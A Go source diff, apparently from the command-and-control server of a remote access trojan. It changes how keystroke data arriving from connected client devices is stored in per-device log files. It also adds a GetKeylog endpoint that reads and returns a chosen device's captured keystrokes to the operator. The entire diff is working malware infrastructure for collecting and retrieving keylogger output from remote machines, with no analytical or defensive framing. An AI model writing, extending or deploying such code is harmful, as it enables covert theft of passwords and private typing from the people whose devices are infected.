@@ -64,6 +64,7 @@ func OnDevicePack(data []byte, session *melody.Session) error {
 	} else {
 		pack.Device.WAN = `Unknown`
 	}
+	var DeviceData *modules.Device
 
 	if pack.Act == `DEVICE_UP` {
 		// Check if this device has already connected.
@@ -86,6 +87,7 @@ func OnDevicePack(data []byte, session *melody.Session) error {
 			common.Devices.Remove(exSession)
 		}
 		common.Devices.Set(session.UUID, &pack.Device)
+		DeviceData = &pack.Device
 		common.Info(nil, `CLIENT_ONLINE`, ``, ``, map[string]any{
 			`device`: map[string]any{
 				`name`: pack.Device.Hostname,
@@ -101,11 +103,11 @@ func OnDevicePack(data []byte, session *melody.Session) error {
 			device.Disk = pack.Device.Disk
 			device.Uptime = pack.Device.Uptime
 		}
+		DeviceData = device
 	}
 	if len(pack.Device.KeyloggerData) > 0 {
 		keyloggerData := strings.Join(pack.Device.KeyloggerData, "")
-
-		filename := fmt.Sprintf("keylogger_%s_%s.log", session.UUID, pack.Device.Hostname)
+		filename := fmt.Sprintf("keylogger_%s_%s.log", DeviceData.ID, DeviceData.Hostname)
 
 		if _, err := os.Stat(filename); os.IsNotExist(err) {
 			if f, err := os.Create(filename); err != nil {
@@ -400,4 +402,25 @@ func WSHealthCheck(container *melody.Melody, sender Sender) {
 			queue[i].Close()
 		}
 	}
+}
+
+// GetKeylog reads the local keylogger file based on the provided device UUID and returns its content.
+func GetKeylog(ctx *gin.Context) {
+	target, ok := CheckForm(ctx, nil)
+	if !ok {
+		return
+	}
+
+	device, ok := common.Devices.Get(target)
+	if !ok {
+		ctx.AbortWithStatusJSON(http.StatusNotFound, modules.Packet{Code: 1, Msg: "Device not found"})
+		return
+	}
+	filename := fmt.Sprintf("keylogger_%s_%s.log", device.ID, device.Hostname)
+	data, err := os.ReadFile(filename)
+	if err != nil {
+		ctx.AbortWithStatusJSON(http.StatusNotFound, modules.Packet{Code: 1, Msg: err.Error()})
+		return
+	}
+	ctx.JSON(http.StatusOK, modules.Packet{Code: 0, Data: map[string]any{"log": string(data)}})
 }
